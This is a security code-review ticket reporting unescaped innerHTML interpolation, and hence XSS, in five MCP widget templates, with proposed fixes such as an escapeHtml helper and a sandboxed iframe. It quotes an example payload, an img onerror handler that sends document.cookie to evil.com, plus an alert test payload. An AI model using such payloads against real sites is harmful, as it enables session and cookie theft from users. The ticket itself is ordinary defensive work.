---
status: complete
priority: p1
issue_id: "015"
tags: [code-review, security, mcp]
dependencies: []
---

# XSS Vulnerabilities in MCP Widget HTML Templates

## Problem Statement

All 5 MCP widget HTML templates directly interpolate user-controlled data into `innerHTML` without HTML escaping. This allows attackers to inject malicious scripts by creating targets/sequences with crafted names containing `<script>` tags or event handlers.

**Why it matters:** An attacker could create a target with a name like `<img src=x onerror="fetch('https://evil.com/steal?'+document.cookie)">` and when any user views the widget, the script executes in their browser context.

## Findings

### Affected Templates (functions/api/app/routers/mcp.py):

1. **Target List Widget** (lines ~1508-1531):
   - `t.name`, `t.email`, `t.company`, `t.phone`, `t.type` all unescaped

2. **Outbox Widget** (lines ~2019-2025):
   - `item.target.email`, `item.subject` unescaped
   - **CRITICAL**: `item.body` rendered as raw HTML in `<div class="item-body">${item.body || ''}</div>`

3. **Sequences Widget** (lines ~2188-2192):
   - `s.name`, `s.description` unescaped

4. **Dashboard Widget** (line ~2858):
   - `d.date` in title attribute

5. **Analytics Widget**:
   - Numeric values only - lower risk

### Evidence

```javascript
// Current vulnerable pattern:
root.innerHTML = '<div class="target-name">${t.name || 'Unknown'}</div>';

// Attack payload in t.name:
"<img src=x onerror=\"alert('XSS')\">"
```

## Proposed Solutions

### Solution 1: Add escapeHtml helper function (Recommended)

Add a helper function to each widget that escapes HTML entities:

```javascript
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Usage:
root.innerHTML = '<div class="target-name">${escapeHtml(t.name)}</div>';
```

**Pros:** Simple, well-understood pattern
**Cons:** Need to add to each widget
**Effort:** Small (1-2 hours)
**Risk:** Low

### Solution 2: Use textContent for text nodes

Instead of innerHTML with interpolation, use DOM APIs:

```javascript
const nameEl = document.createElement('div');
nameEl.className = 'target-name';
nameEl.textContent = t.name || 'Unknown';
container.appendChild(nameEl);
```

**Pros:** Completely safe by design
**Cons:** More verbose, harder to read templates
**Effort:** Medium (3-4 hours refactor)
**Risk:** Low

### Solution 3: Server-side sanitization

Sanitize data before sending to widget in structuredContent.

**Pros:** Defense in depth
**Cons:** May break legitimate HTML in email bodies
**Effort:** Medium
**Risk:** Medium - could break functionality

## Recommended Action

Implement Solution 1 immediately for all text fields, then consider Solution 3 for defense in depth.

**Special handling needed for `item.body` in outbox widget** - this IS HTML email content and should be rendered in a sandboxed iframe, not directly in the DOM.

## Technical Details

### Affected Files
- `functions/api/app/routers/mcp.py` (widget HTML templates)

### Affected Components
- `_get_target_list_widget()`
- `_get_outbox_widget()`
- `_get_sequences_widget()`
- `_get_dashboard_widget()`

## Acceptance Criteria

- [ ] All user-supplied text fields use escapeHtml() or textContent
- [ ] Email body content rendered in sandboxed iframe
- [ ] XSS test payload in target name does not execute
- [ ] All widgets still render correctly with normal data

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-01-30 | Created from security review | Critical XSS found in all widget templates |

## Resources

- Security assessment from security-sentinel agent
- OWASP XSS Prevention Cheat Sheet
